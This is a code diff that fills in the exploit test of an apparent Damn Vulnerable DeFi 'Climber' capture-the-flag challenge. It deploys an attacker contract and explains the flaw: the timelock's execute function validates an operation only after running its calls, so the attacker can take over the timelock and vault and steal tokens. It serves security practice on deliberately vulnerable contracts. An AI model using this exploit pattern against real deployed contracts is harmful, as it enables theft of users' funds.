@@ -53,6 +53,26 @@ describe('[Challenge] Climber', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        const climberAttackerContractFactory = await ethers.getContractFactory(
+            "ClimberAttacker",
+            deployer
+        )
+
+        this.climberAttacker = await climberAttackerContractFactory
+            .connect(attacker)
+            .deploy(
+                this.timelock.address,
+                this.vault.address,
+                this.token.address
+            )
+    
+        /* 
+            Vulnerability:
+            The timelock execute function checks that an operation id is valid after executing the
+            calls contained therein. The attack exploits this ordering to gain control of the
+            timelock and vault contracts, ultimately resulting in stolen tokens.
+        */
+        await this.climberAttacker.connect(attacker).attack()
     });
 
     after(async function () {
